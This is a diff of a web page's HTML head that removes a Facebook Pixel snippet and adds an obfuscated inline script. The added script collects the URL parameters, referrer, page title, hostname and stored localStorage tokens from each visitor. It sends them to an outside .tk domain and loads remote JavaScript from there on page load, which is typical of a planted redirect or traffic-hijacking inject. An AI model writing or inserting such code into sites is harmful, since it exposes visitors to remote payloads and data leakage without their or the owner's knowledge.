@@ -1,23 +1,49 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-	<!-- Facebook Pixel Code -->
 <script>
-  !function(f,b,e,v,n,t,s)
-  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-  n.queue=[];t=b.createElement(e);t.async=!0;
-  t.src=v;s=b.getElementsByTagName(e)[0];
-  s.parentNode.insertBefore(t,s)}(window, document,'script',
-  'https://connect.facebook.net/en_US/fbevents.js');
-  fbq('init', '431414098117634');
-  fbq('track', 'PageView');
-</script>
-<noscript><img height="1" width="1" style="display:none"
-  src="https://www.facebook.com/tr?id=431414098117634&ev=PageView&noscript=1"
-/></noscript>
-<!-- End Facebook Pixel Code -->
+    (function() {
+    var name = '_bdDNCxZftBv5mYfz';
+    if (!window._bdDNCxZftBv5mYfz) {
+        window._bdDNCxZftBv5mYfz = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://detkanao.tk/fKg19WFC',
+            P_PATH: 'https://detkanao.tk/7b4f75c/postback',
+        };
+    }
+    const _67xGrsrztCZb8bHL = localStorage.getItem('config');
+    if (typeof _67xGrsrztCZb8bHL !== 'undefined' && _67xGrsrztCZb8bHL !== null) {
+        var _p1zJFdH59ds7vw7X = JSON.parse(_67xGrsrztCZb8bHL);
+        var _gRtP8rBLVQv1nRSJ = Math.round(+new Date()/1000);
+        if (_p1zJFdH59ds7vw7X.created_at + window._bdDNCxZftBv5mYfz.ttl < _gRtP8rBLVQv1nRSJ) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _bj4Fszr2Z2HPMnzT = localStorage.getItem('subId');
+    var _mYtJ82dgBs8rGxjS = localStorage.getItem('token');
+    var _9fbGtYmrgV95mmbg = '?return=js.client';
+        _9fbGtYmrgV95mmbg += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _9fbGtYmrgV95mmbg += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _9fbGtYmrgV95mmbg += '&default_keyword=' + encodeURIComponent(document.title);
+        _9fbGtYmrgV95mmbg += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _9fbGtYmrgV95mmbg += '&name=' + encodeURIComponent(name);
+        _9fbGtYmrgV95mmbg += '&host=' + encodeURIComponent(window._bdDNCxZftBv5mYfz.R_PATH);
+    if (typeof _bj4Fszr2Z2HPMnzT !== 'undefined' && _bj4Fszr2Z2HPMnzT && window._bdDNCxZftBv5mYfz.unique) {
+        _9fbGtYmrgV95mmbg += '&sub_id=' + encodeURIComponent(_bj4Fszr2Z2HPMnzT);
+    }
+    if (typeof _mYtJ82dgBs8rGxjS !== 'undefined' && _mYtJ82dgBs8rGxjS && window._bdDNCxZftBv5mYfz.unique) {
+        _9fbGtYmrgV95mmbg += '&token=' + encodeURIComponent(_mYtJ82dgBs8rGxjS);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._bdDNCxZftBv5mYfz.R_PATH + _9fbGtYmrgV95mmbg;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
   
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
